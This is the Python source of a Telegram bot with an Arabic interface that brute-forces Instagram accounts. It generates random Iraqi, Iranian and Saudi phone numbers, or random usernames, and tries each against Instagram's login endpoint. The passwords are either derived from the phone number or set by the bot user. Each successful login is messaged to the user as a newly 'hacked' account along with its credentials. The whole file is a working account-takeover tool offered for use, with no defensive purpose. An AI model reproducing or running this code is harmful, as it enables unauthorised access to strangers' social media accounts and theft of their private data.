
#~~~~~~~~~~~~~~~ Libraries..

import os
clear = lambda : os.system('clear')
#- - - - - - - - - - - - • LIB
def pip(p):
	for i in p:
		os.system(f'pip install {i}')
		clear()
	
try:
	import random , json , re ,string
	import requests
	import telebot
	from telebot import types
	from colorama import init, Fore, Back, Style
	init()
except:
	pip(['random','requests','pytelegrambotapi','json','re','string','colorama'])
	import random , json , re , string
	import requests
	import telebot
	from telebot import types
	from colorama import init, Fore, Back, Style
	init()

#- - - - - - - - - - - - • 


use = string.ascii_letters


if os.path.exists('Token.json') == False:
	open('Token.json','a')
	data =({"token": "","password":""})
	json.dump(data, open('Token.json', 'w'))

#~~~~~~~~~~~~~~~ Token
def check():
	if json.load(open('Token.json','r'))['token'] == "":
		Token = input("\n\n    \n     "+Back.BLUE + Fore.WHITE  +Style.BRIGHT+ " → T O K E N : ")
		Data = json.load(open('Token.json','r'))
		Data['token'] = Token
		json.dump(Data, open('Token.json', 'w'))
	else:
		T = input("\n\n    [ 1 ] Run Bot ..\n\n    [ 2 ] Token change  ..     \n\n\n     "+Back.BLUE + Fore.WHITE  +Style.BRIGHT+ " → : ")
		if T == "1":
			pass
		elif T == "2":
			Token = input("\n\n    \n     "+Back.BLUE + Fore.WHITE  +Style.BRIGHT+ " → T O K E N :    ")
			Data = json.load(open('Token.json','r'))
			Data['token'] = Token
			json.dump(Data, open('Token.json', 'w'))
			
		
check()


print(Back.BLACK+"\n\n\n\n         "+Fore.RED +" [★]  R U N ... ")

#~~~~~~~~~~~~~~~ start bot..
bot = telebot.TeleBot(json.load(open('Token.json','r'))['token'])
	


#~~~~~~~~~~~~~~~ get user..
def get_user():
	
	user = ''.join(
			random.choice(random.choice(random.choice(use + "_."))) for i in range(random.randint(3,7))
		)
	
	return user if user[0] != '.' and ".." not in user and '.' not in user[-1] and ('.' in user or '_' in user) and (user.count('.') < 2) else get_user()



#~~~~~~~~~~~~~~~ login insta..
class login_insta:
	def __init__(self):
		self.request = requests.Session()
	
	def csrf(self):
		h={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',

			'cache-control': 'max-age=0',
			'cookie': 'ig_did=817C02D7-08B6-49CD-B7E6-B37DB0366885; ig_nrcb=1; mid=Y_jlAQALAAFz1pH33imct1rP-K2S; dpr=1.25; datr=JuX4Ywr5u10JYE_qrbI3y116; shbid="16016\0541944705027\0541710358837:01f7c148d5f19e4ea00ba3910b6df2b10240de930d798965c8540eedf7243fb7091a8bd9"; shbts="1678822837\0541944705027\0541710358837:01f77cb113046b73a1537d4e3f41219319029abac082e41a8f6787a04fadbbb5fa6bdf2b"; rur="RVA\05458564416784\0541710364293:01f75f4d231cdc4777a99768d35346dad665c09be43416fe8f930ffad0451c82f422d994"; csrftoken=ZHhk0hmO8p2BBup6Mg8mQ2vBS7ZwFoOk',
			'sec-ch-prefers-color-scheme': 'light',
			'sec-ch-ua':'"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
			'sec-ch-ua-mobile':'?0',
			'sec-ch-ua-platform':'"Windows"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
			'viewport-width': '727'}

		response = self.request.get('https://www.instagram.com/accounts/login/',headers=h)
		c = re.findall(r"csrf_token\":\"(.*?)\"",response.text)[0]
		return c
		
	def login(self,user,pas):
		response =self.request.post("https://i.instagram.com/api/v1/web/accounts/login/ajax/",headers={'Host': 'www.instagram.com','content-length': '333','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-ig-app-id': '1217981644879628','x-ig-www-claim': '0','x-requested-with': 'XMLHttpRequest','sec-ch-ua-mobile': '?1','x-instagram-ajax': '4b5f8c8eb791','viewport-width': '412','content-type': 'application/x-www-form-urlencoded','accept': '*/*','x-csrftoken':self.csrf(),'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','x-asbd-id': '198387','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua-platform': '"Android"','origin': 'https://www.instagram.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.instagram.com/'},data={'username':user,'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{pas}','queryParams': '{}','optIntoOneTap': 'false'}).text
		
		if 'authenticated":true' in response:
			print(Fore.GREEN+f" [★] True :  {user}  ")
			return True
			
		else:
			print(Fore.RED+f" [★] False :  {user}  ")
			return False
			




#~~~~~~~~~~~~~~~ KeyBoards..
def keyboard(done,bad,num,user,pas):
	A1 = types.InlineKeyboardButton(f" تم الصيد 🟢: {done}",callback_data="iii")
	A2 = types.InlineKeyboardButton(f" فشل 🔴: {bad} ",callback_data="iran")
	A3 = types.InlineKeyboardButton(f"{num} | {user} : {pas} ",callback_data="ksa")
	A4 = types.InlineKeyboardButton("ايقاف",callback_data="stop")
	inline = types.InlineKeyboardMarkup(keyboard=[[A1],[A2],[A3],[A4]])
	return inline

def number():
	A1 = types.InlineKeyboardButton(" العراق 🇮🇶 ",callback_data="iraq")
	A2 = types.InlineKeyboardButton(" ايران 🇬🇶 ",callback_data="iran")
	A3 = types.InlineKeyboardButton(" السعودية 🇸🇦 ",callback_data="ksa")
	A5 = types.InlineKeyboardButton("رجوع",callback_data="back")
	inline = types.InlineKeyboardMarkup(keyboard=[[A1,A2],[A3],[A5]])
	return inline
	
def Start():
	A1 = types.InlineKeyboardButton("تخمين على ارقام",callback_data="num")
	A2 = types.InlineKeyboardButton("تخمين على يوزرات ",callback_data="user")
	
	A3 = types.InlineKeyboardButton(" تحديد باسورد ",callback_data="password")
	
	inline = types.InlineKeyboardMarkup(keyboard=[[A1],[A2],[A3]])
	return inline

def uss():
	A1 = types.InlineKeyboardButton("بدأ الصيد",callback_data="user")
	A2 = types.InlineKeyboardButton("رجوع",callback_data="back")
	inline = types.InlineKeyboardMarkup(keyboard=[[A1],[A2]])
	return inline
	
#~~~~~~~~~~~~~~~ /START.
@bot.message_handler(commands=['start'])
def start(m):
  id = m.chat.id
  name = m.chat.first_name
  user = m.chat.username
  passwo = json.load(open('Token.json','r'))['password']
  if passwo == '':
  	passwo = 'لايوجد باسورد'
  else:
  	pass
  link_account = f' |  [{name}](t.me/{user})  | '
  link_ch = f' |  [ArsThon](t.me/YYYY02)  | '
  text = f"""
✦ اهلا بك عزيزي {link_account} في البوت
✦ البوت مقدم من قناة {link_ch}
✦ يمكنك الصيد على ثلاث دول ( العراق - ايران  - السعوديه ) ..:
 
| الباسورد : {passwo}
 
 ✦ اختر من الاسفل ↓ 
  """
  
  bot.send_message(id,text,parse_mode='markdown', disable_web_page_preview='true',reply_markup=Start())

	
@bot.callback_query_handler(lambda call:True)
def call(call):
  
  global loop
  loop = True
  num , done , bad = 0,0,0
  X = None
  
  id = call.from_user.id
  name = call.from_user.first_name
  user = call.from_user.username
  
  passw = json.load(open('Token.json','r'))
  password = passw["password"]
  	
  link_account = f' |  [{name}](t.me/{user})  | '
  link_ch = f' |  [ArsThon](t.me/YYYY02)  | '
  
  
  text = f"""
✦ اهلا بك عزيزي {link_account} في البوت
✦ البوت مقدم من قناة {link_ch}
✦ يمكنك الصيد على ثلاث دول ( العراق - ايران - السعوديه )
 
 ✦ اختر من الاسفل ↓ 
  """
  text2 = f"جار الصيد يرجى الانتظار ... \n \n ..."
  
  if call.data == "stop":
  	loop = False
  	
  	bot.delete_message(id,call.message.message_id)
  	bot.send_message(id,text,reply_markup=Start(),parse_mode='markdown', disable_web_page_preview='true')
  if call.data == "back":
  	bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=text,reply_markup=Start(),parse_mode='markdown', disable_web_page_preview='true')
  	
  
  #~~~~~~~~~~~~~~~
  if call.data == 'num':
  	bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=text,reply_markup=number(),parse_mode='markdown', disable_web_page_preview='true')
  
  
  
  	
  if call.data == "iraq":
  	while loop:
  		if loop == False:
	  		break
	  		print(" ¦ stop .")
  		num+=1
	  	username , passw = gen_iraq()
	  	text3 = f'''تم اختراق حساب جديد ⚡
	  		
	يوزرنيم : `{username}`
باسورد : {passw}
'''
	  	if login_insta().login(username,passw):
	  		done+=1
	  		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=text2,reply_markup=keyboard(done,bad,num,username,passw),parse_mode='markdown', disable_web_page_preview='true')
	  		bot.send_message(id,text = text3,parse_mode='markdown', disable_web_page_preview='true')
	  	else:
	  		bad+=1
	  		try:
	  			bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=text2,reply_markup=keyboard(done,bad,num,username,passw),parse_mode='markdown', disable_web_page_preview='true')
	  		except Exception as ex:
	  			print(ex)
  	
  if call.data == "iran":
  	while loop:
  		if loop == False:
	  		break
	  		print(" ¦ stop .")
  		num+=1
	  	username , passw = gen_iran()
	  	text3 = f'''تم اختراق حساب جديد ⚡
	  		
	يوزرنيم : `{username}`
باسورد : {passw}
'''
	  	if login_insta().login(username,passw):
	  		done+=1
	  		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=text2,reply_markup=keyboard(done,bad,num,username,passw),parse_mode='markdown', disable_web_page_preview='true')
	  		bot.send_message(id,text = text3,parse_mode='markdown', disable_web_page_preview='true')
	  	else:
	  		bad+=1
	  		try:
	  			bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=text2,reply_markup=keyboard(done,bad,num,username,passw),parse_mode='markdown', disable_web_page_preview='true')
	  		except Exception as ex:
	  			pass
  	
  if call.data == "ksa":
  	while loop:
  		if loop == False:
	  		break
	  		print(" ¦ stop .")
  		num+=1
	  	username , passw = gen_ksa()
	  	text3 = f'''تم اختراق حساب جديد ⚡
	  		
	يوزرنيم : `{username}`
باسورد : {passw}
'''
	  	if login_insta().login(username,passw):
	  		done+=1
	  		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=text2,reply_markup=keyboard(done,bad,num,username,passw),parse_mode='markdown', disable_web_page_preview='true')
	  		bot.send_message(id,text = text3,parse_mode='markdown', disable_web_page_preview='true')
	  	else:
	  		bad+=1
	  		try:
	  			bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=text2,reply_markup=keyboard(done,bad,num,username,passw),parse_mode='markdown', disable_web_page_preview='true')
	  		except Exception as ex:
	  			pass
  #~~~~~~~~~~~~~~~
  
  
  
  #~~~~~~~~~~~~~~~
  if call.data == "user":
  	
  	if password == "":
  		try:
  			messag=bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text = f''' يرجى وضع باسورد اولاً 
 ارسل الان الباسورد .. ''')	
  			bot.register_next_step_handler(messag, addpassw)  
  		except:
		  	pass	
  		loop = False
  	while loop:
  		if loop == False:
	  		break
	  		print(" ¦ stop .")
  		num+=1
  		u = get_user()
	  	text3 = f'''تم اختراق حساب جديد ⚡
	  		
	يوزرنيم : `{u}`
باسورد : {password}
'''
	  	if login_insta().login(u,password):
	  		done+=1
	  		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=text2,reply_markup=keyboard(done,bad,num,u,password),parse_mode='markdown', disable_web_page_preview='true')
	  		bot.send_message(id,text = text3,parse_mode='markdown', disable_web_page_preview='true')
	  	else:
	  		bad+=1
	  		try:
	  			bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=text2,reply_markup=keyboard(done,bad,num,u,password),parse_mode='markdown', disable_web_page_preview='true')
	  		except Exception as ex:
	  			pass
  
  #~~~~~~~~~~~~~~~
  
  
  
  
  if call.data == 'password':
  	try:
  		messag=bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text = f''' 
 ارسل الان الباسورد .. ''')
  		bot.register_next_step_handler(messag, addpassw)
  	
  	except:
	  	pass	

#~~~~~~~~~~~~~~~ add password
def addpassw(message):
	try:
		Data = json.load(open('Token.json', 'r'))
		bot.send_message(chat_id=message.chat.id,text=f'تم وضع باسورد بنجاح : {message.text}\n\n  The password has been set successfully 🜅',reply_markup = uss())
		Data["password"]  = message.text
		json.dump(Data, open('Token.json', 'w'))	
	except:
			pass	


#- - - - - - - - - - - - • 
def gen_iraq():
	u = '0987654321'
	n = "77","78","75"
	us = str("".join(random.choice(u)for i in range(8)))
	us2 = random.choice(n)
	user = "+964"+us2+us
	passw = '0'+us2+us
	return user , passw



def gen_iran():
	u = '0987654321'
	n = '912','911','914','913','915','910','916','917','918','919','990','991','901','902','903','904','905','930','931','932','933','934','935','935','936','937','938','939','920','921','922'
	us = str("".join(random.choice(u)for i in range(7)))
	us2 = random.choice(n)
	user = "+98"+us2+us
	passw = '0'+us2+us
	return user , passw

def gen_ksa():
	u = '0987654321'
	n = "11","12","13","14","16","17"
	us = str("".join(random.choice(u)for i in range(7)))
	us2 = random.choice(n)
	user = "+966"+us2+us
	passw = '0'+us2+us
	return user , passw 
#- - - - - - - - - - - - • 






#~~~~~~~~~~~~~~~ RUN BOT...
def run():
	
	while True:
	    try:
	    	bot.infinity_polling(interval=0, timeout=0)
	    except Exception as e:
	    	print(e)

run()